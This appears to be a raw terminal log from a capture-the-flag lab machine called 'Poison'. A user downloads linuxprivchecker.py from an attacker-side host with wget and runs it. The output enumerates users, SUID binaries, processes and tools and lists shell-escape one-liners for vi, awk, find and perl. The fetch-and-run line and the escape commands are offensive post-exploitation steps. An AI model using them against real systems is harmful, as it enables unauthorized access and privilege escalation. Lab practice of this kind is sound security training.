charix@Poison:~ % wget http://10.10.14.2:9008/linuxprivchecker.py
--2019-12-02 11:25:43--  http://10.10.14.2:9008/linuxprivchecker.py
Connecting to 10.10.14.2:9008... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/plain]
Saving to: 'linuxprivchecker.py'

linuxprivchecker.py                            100%[=================================================================================================>]  24.71K   157KB/s    in 0.2s    

2019-12-02 11:25:44 (157 KB/s) - 'linuxprivchecker.py' saved [25304/25304]

charix@Poison:~ % ls
linuxprivchecker.py	secret.zip		user.txt
charix@Poison:~ % chmod +x linuxprivchecker.py 
charix@Poison:~ % which python
/usr/local/bin/python
charix@Poison:~ % python linuxprivchecker.py 
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel

[+] Hostname
    Poison

[+] Operating System

[*] GETTING NETWORKING INFO...

[+] Interfaces
    le0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
    options=8<VLAN_MTU>
    ether 00:50:56:b9:c9:e9
    hwaddr 00:50:56:b9:c9:e9
    inet 10.10.10.84 netmask 0xffffff00 broadcast 10.10.10.255
    nd6 options=29<PERFORMNUD,IFDISABLED,AUTO_LINKLOCAL>
    media: Ethernet autoselect
    status: active
    lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
    options=600003<RXCSUM,TXCSUM,RXCSUM_IPV6,TXCSUM_IPV6>
    inet6 ::1 prefixlen 128
    inet6 fe80::1%lo0 prefixlen 64 scopeid 0x2
    inet 127.0.0.1 netmask 0xff000000
    nd6 options=21<PERFORMNUD,AUTO_LINKLOCAL>
    groups: lo

[+] Netstat

[+] Route

[*] GETTING FILESYSTEM INFO...

[+] Mount results
    /dev/da0s1a on / (ufs, local, journaled soft-updates)
    devfs on /dev (devfs, local, multilabel)

[+] fstab entries
    # Device	Mountpoint	FStype	Options	Dump	Pass#
    /dev/da0s1a	/		ufs	rw	1	1
    /dev/da0s1b	none		swap	sw	0	0

[+] Scheduled cron jobs
    -rw-r--r--  1 root  wheel  730 Jul 21  2017 /etc/crontab
    /etc/cron.d:
    total 8
    drwxr-xr-x   2 root  wheel   512 Jul 21  2017 .
    drwxr-xr-x  27 root  wheel  2560 Mar 19  2018 ..

[+] Writable cron dirs


[*] ENUMERATING USER AND ENVIRONMENTAL INFO...

[+] Logged in User Activity
    11:26AM  up 15 mins, 2 users, load averages: 0.41, 0.37, 0.30
    USER       TTY      FROM                                      LOGIN@  IDLE WHAT
    charix     pts/1    10.10.14.2                               11:13AM    11 -csh (csh)
    charix     pts/2    10.10.14.2                               11:24AM     - w

[+] Super Users Found:
    root
    toor

[+] Environment
    VENDOR=amd
    SSH_CLIENT=10.10.14.2 60694 22
    LOGNAME=charix
    PAGER=more
    OSTYPE=FreeBSD
    MACHTYPE=x86_64
    MAIL=/var/mail/charix
    PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/charix/bin
    EDITOR=vi
    HOST=Poison
    REMOTEHOST=10.10.14.2
    PWD=/home/charix
    GROUP=charix
    TERM=xterm-256color
    SSH_TTY=/dev/pts/2
    HOME=/home/charix
    USER=charix
    SSH_CONNECTION=10.10.14.2 60694 10.10.10.84 22
    HOSTTYPE=FreeBSD
    SHELL=/bin/csh
    BLOCKSIZE=K
    SHLVL=1

[+] Root and current user history (depends on privs)

[+] Sudoers (privileged)

[+] All users
    # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
    #
    root:*:0:0:Charlie &:/root:/bin/csh
    toor:*:0:0:Bourne-again Superuser:/root:
    daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
    operator:*:2:5:System &:/:/usr/sbin/nologin
    bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
    tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
    kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
    games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
    news:*:8:8:News Subsystem:/:/usr/sbin/nologin
    man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
    sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
    smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
    mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
    bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
    unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
    proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
    _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
    _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
    uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
    pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
    auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
    www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
    _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
    hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
    nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
    _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
    messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
    avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
    cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
    charix:*:1001:1001:charix:/home/charix:/bin/csh

[+] Current User
    charix

[+] Current User ID
    uid=1001(charix) gid=1001(charix) groups=1001(charix)

[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...

[+] World Writeable Directories for User/Group 'Root'
    drwxrwxrwt  6 root  wheel  512 Dec  2 11:12 /tmp
    drwxrwxrwt  2 root  wheel  512 Dec  2 11:12 /tmp/.X11-unix
    drwxrwxrwt  2 root  wheel  512 Dec  2 11:12 /tmp/.XIM-unix
    drwxrwxrwt  2 root  wheel  512 Dec  2 11:12 /tmp/.ICE-unix
    drwxrwxrwt  2 root  wheel  512 Dec  2 11:12 /tmp/.font-unix
    drwxrwxrwt  3 root  wheel  512 Jul 21  2017 /var/tmp
    drwxrwxrwt  2 root  wheel  512 Mar 19  2018 /var/tmp/vi.recover

[+] World Writeable Directories for Users other than Root

[+] World Writable Files

[+] Checking if root's home folder is accessible
    total 0

[+] SUID/SGID Files and Directories
    -r-xr-sr-x  1 root  kmem  11800 Jul 21  2017 /usr/sbin/trpt
    -r-sr-xr-x  1 root  wheel  26736 Jul 21  2017 /usr/sbin/traceroute6
    -r-sr-sr-x  2 root  authpf  24312 Jul 21  2017 /usr/sbin/authpf-noip
    -r-sr-xr-x  1 root  wheel  32808 Jul 21  2017 /usr/sbin/traceroute
    -r-sr-xr-x  1 root  wheel  21512 Jul 21  2017 /usr/sbin/timedc
    -r-sr-sr-x  2 root  authpf  24312 Jul 21  2017 /usr/sbin/authpf
    -r-sr-xr--  1 root  network  433872 Jul 21  2017 /usr/sbin/ppp
    -r-xr-sr-x  1 root  daemon  59800 Jul 21  2017 /usr/sbin/lpc
    -r-xr-sr-x  1 root  smmsp  729800 Jul 21  2017 /usr/libexec/sendmail/sendmail
    -r-sr-xr--  1 root  mail  7424 Jul 21  2017 /usr/libexec/dma-mbox-create
    -r-sr-xr-x  1 root  wheel  6232 Jul 21  2017 /usr/libexec/ulog-helper
    -r-sr-xr-x  1 root  wheel  49152 Jul 21  2017 /usr/libexec/ssh-keysign
    -r-xr-sr-x  1 root  mail  63088 Jul 21  2017 /usr/libexec/dma
    -r-sr-sr-x  1 root  daemon  34368 Jul 21  2017 /usr/bin/lpq
    -r-sr-xr-x  1 root  wheel  16216 Jul 21  2017 /usr/bin/rlogin
    -r-sr-sr-x  1 root  daemon  33072 Jul 21  2017 /usr/bin/lprm
    -r-xr-sr-x  1 root  kmem  13840 Jul 21  2017 /usr/bin/btsockstat
    -r-sr-sr-x  1 root  daemon  41248 Jul 21  2017 /usr/bin/lpr
    -r-sr-xr-x  4 root  wheel  29016 Jul 21  2017 /usr/bin/at
    -r-sr-xr-x  1 root  wheel  33288 Jul 21  2017 /usr/bin/crontab
    -r-sr-xr-x  4 root  wheel  29016 Jul 21  2017 /usr/bin/atrm
    -r-sr-xr-x  4 root  wheel  29016 Jul 21  2017 /usr/bin/atq
    -r-sr-xr-x  1 root  wheel  17584 Jul 21  2017 /usr/bin/su
    -r-sr-xr-x  1 root  wheel  25488 Jul 21  2017 /usr/bin/chpass
    -r-sr-xr-x  1 root  wheel  16264 Jul 21  2017 /usr/bin/quota
    -r-sr-xr-x  1 root  wheel  9856 Jul 21  2017 /usr/bin/passwd
    -r-xr-sr-x  1 root  tty  12280 Jul 21  2017 /usr/bin/write
    -r-sr-xr-x  1 root  wheel  7256 Jul 21  2017 /usr/bin/opieinfo
    -r-xr-sr-x  1 root  kmem  154448 Jul 21  2017 /usr/bin/netstat
    -r-sr-xr-x  1 root  wheel  26040 Jul 21  2017 /usr/bin/login
    -r-sr-xr-x  4 root  wheel  29016 Jul 21  2017 /usr/bin/batch
    -r-xr-sr-x  1 root  tty  15984 Jul 21  2017 /usr/bin/wall
    -r-sr-xr-x  1 root  wheel  14304 Jul 21  2017 /usr/bin/opiepasswd
    -r-sr-xr-x  1 root  wheel  11600 Jul 21  2017 /usr/bin/lock
    -r-sr-xr-x  1 root  wheel  12192 Jul 21  2017 /usr/bin/rsh
    -r-sr-xr-x  1 root  wheel  2191384 Jan  2  2018 /usr/local/bin/Xorg
    -rwsr-x---  1 root  messagebus  49416 Jan  2  2018 /usr/local/libexec/dbus-daemon-launch-helper
    -r-sr-xr-x  1 root  wheel  20912 Jul 21  2017 /bin/rcp
    -r-sr-xr-x  1 root  wheel  40752 Jul 21  2017 /sbin/ping6
    -r-sr-xr--  2 root  operator  15904 Jul 21  2017 /sbin/poweroff
    -r-sr-xr--  1 root  operator  10600 Jul 21  2017 /sbin/mksnap_ffs
    -r-sr-xr--  2 root  operator  15904 Jul 21  2017 /sbin/shutdown
    -r-sr-xr-x  1 root  wheel  32488 Jul 21  2017 /sbin/ping

[+] Logs containing keyword 'password'

[+] Config files containing keyword 'password'

[+] Shadow File (Privileged)

[*] ENUMERATING PROCESSES AND APPLICATIONS...

[+] Installed Packages

[+] Current processes
    USER PID STARTED TIME COMMAND
    root 11 11:11 15:11.17 [idle]
    root 12 11:11 0:00.83 [intr]
    root 4 11:11 0:00.27 [cam]
    root 0 11:11 0:00.00 [kernel]
    root 1 11:11 0:00.00 /sbin/init
    root 2 11:11 0:00.00 [crypto]
    root 3 11:11 0:00.00 [crypto
    root 5 11:11 0:00.00 [mpt_recovery0]
    root 6 11:11 0:00.00 [sctp_iterator]
    root 7 11:11 0:00.91 [rand_harvestq]
    root 8 11:11 0:00.00 [soaiod1]
    root 9 11:11 0:00.00 [soaiod2]
    root 10 11:11 0:00.00 [audit]
    root 13 11:11 0:00.00 [geom]
    root 14 11:11 0:00.09 [usb]
    root 15 11:11 0:00.00 [soaiod3]
    root 16 11:11 0:00.00 [soaiod4]
    root 17 11:11 0:00.02 [pagedaemon]
    root 18 11:11 0:00.00 [vmdaemon]
    root 19 11:11 0:00.00 [pagezero]
    root 20 11:11 0:00.01 [bufdaemon]
    root 21 11:11 0:00.00 [bufspacedaemon]
    root 22 11:11 0:00.02 [syncer]
    root 23 11:11 0:00.16 [vnlru]
    root 319 11:12 0:00.05 /sbin/devd
    root 390 11:12 0:00.02 /usr/sbin/syslogd
    root 543 11:12 0:00.49 /usr/local/bin/vmtoolsd
    root 620 11:12 0:00.00 /usr/sbin/sshd
    root 625 11:13 0:00.02 sshd:
    root 627 11:13 0:00.03 /usr/local/sbin/httpd
    charix 640 11:13 0:00.01 sshd:
    www 644 11:14 0:00.00 /usr/local/sbin/httpd
    www 645 11:14 0:00.00 /usr/local/sbin/httpd
    www 646 11:14 0:00.00 /usr/local/sbin/httpd
    www 647 11:14 0:00.00 /usr/local/sbin/httpd
    www 648 11:14 0:00.00 /usr/local/sbin/httpd
    root 649 11:14 0:00.01 sendmail:
    smmsp 654 11:14 0:00.00 sendmail:
    root 658 11:14 0:00.00 /usr/sbin/cron
    root 722 11:23 0:00.02 sshd:
    charix 725 11:24 0:00.05 sshd:
    root 529 11:12 0:00.02 Xvnc
    root 540 11:12 0:00.02 xterm
    root 541 11:12 0:00.01 twm
    root 705 11:14 0:00.00 /usr/libexec/getty
    root 706 11:14 0:00.00 /usr/libexec/getty
    root 707 11:14 0:00.00 /usr/libexec/getty
    root 708 11:14 0:00.00 /usr/libexec/getty
    root 709 11:14 0:00.00 /usr/libexec/getty
    root 710 11:14 0:00.00 /usr/libexec/getty
    root 711 11:14 0:00.00 /usr/libexec/getty
    root 712 11:14 0:00.00 /usr/libexec/getty
    root 565 11:12 0:00.01 -csh
    charix 641 11:13 0:00.01 -csh
    charix 726 11:24 0:00.02 -csh
    charix 744 11:26 0:00.05 python
    charix 850 11:27 0:00.00 /bin/sh
    charix 851 11:27 0:00.00 ps
    charix 852 11:27 0:00.00 awk

[+] Apache Version and Modules
    Server version: Apache/2.4.29 (FreeBSD)
    Server built:   unknown
    Compiled in modules:
    core.c
    mod_so.c
    http_core.c

[+] Apache Config File

[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)

[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...

    root 4 11:11 0:00.27 [cam]
    root 319 11:12 0:00.05 /sbin/devd
    root 625 11:13 0:00.02 sshd:
    root 1 11:11 0:00.00 /sbin/init
    root 19 11:11 0:00.00 [pagezero]
    root 709 11:14 0:00.00 /usr/libexec/getty
    root 16 11:11 0:00.00 [soaiod4]
    root 540 11:12 0:00.02 xterm
    root 708 11:14 0:00.00 /usr/libexec/getty
    root 7 11:11 0:00.91 [rand_harvestq]
    root 6 11:11 0:00.00 [sctp_iterator]
    root 23 11:11 0:00.16 [vnlru]
    root 17 11:11 0:00.02 [pagedaemon]
    root 18 11:11 0:00.00 [vmdaemon]
    root 390 11:12 0:00.02 /usr/sbin/syslogd
    root 3 11:11 0:00.00 [crypto
    root 22 11:11 0:00.02 [syncer]
    root 722 11:23 0:00.02 sshd:
    root 10 11:11 0:00.00 [audit]
    root 541 11:12 0:00.01 twm
    root 649 11:14 0:00.01 sendmail:
    root 529 11:12 0:00.02 Xvnc
    root 710 11:14 0:00.00 /usr/libexec/getty
    root 12 11:11 0:00.83 [intr]
    root 11 11:11 15:11.17 [idle]
    root 627 11:13 0:00.03 /usr/local/sbin/httpd
    root 707 11:14 0:00.00 /usr/libexec/getty
    root 14 11:11 0:00.09 [usb]
    root 8 11:11 0:00.00 [soaiod1]
    root 20 11:11 0:00.01 [bufdaemon]
    root 706 11:14 0:00.00 /usr/libexec/getty
    root 620 11:12 0:00.00 /usr/sbin/sshd
    root 13 11:11 0:00.00 [geom]
    root 0 11:11 0:00.00 [kernel]
    root 15 11:11 0:00.00 [soaiod3]
    root 9 11:11 0:00.00 [soaiod2]
    root 712 11:14 0:00.00 /usr/libexec/getty
    root 543 11:12 0:00.49 /usr/local/bin/vmtoolsd
    root 5 11:11 0:00.00 [mpt_recovery0]
    root 565 11:12 0:00.01 -csh
    root 711 11:14 0:00.00 /usr/libexec/getty
    root 2 11:11 0:00.00 [crypto]
    root 658 11:14 0:00.00 /usr/sbin/cron
    root 21 11:11 0:00.00 [bufspacedaemon]
    root 705 11:14 0:00.00 /usr/libexec/getty

[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...

[+] Installed Tools
    /usr/bin/awk
    /usr/local/bin/perl
    /usr/local/bin/python
    /usr/local/bin/ruby
    /usr/bin/cc
    /usr/bin/vi
    /usr/local/bin/vim
    /usr/bin/find
    /usr/bin/nc
    /usr/local/bin/wget
    /usr/bin/tftp
    /usr/bin/ftp

[+] Related Shell Escape Sequences...

    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    vi-->	:!bash
    vi-->	:set shell=/bin/bash:shell
    awk-->	awk 'BEGIN {system("/bin/bash")}'
    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
    perl-->	perl -e 'exec "/bin/bash";'

[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...

Traceback (most recent call last):
  File "linuxprivchecker.py", line 310, in <module>
    version = sysInfo["KERNEL"]["results"][0].split(" ")[2].split("-")[0]
IndexError: list index out of range
charix@Poison:~ % cd /usr/bin/passwd

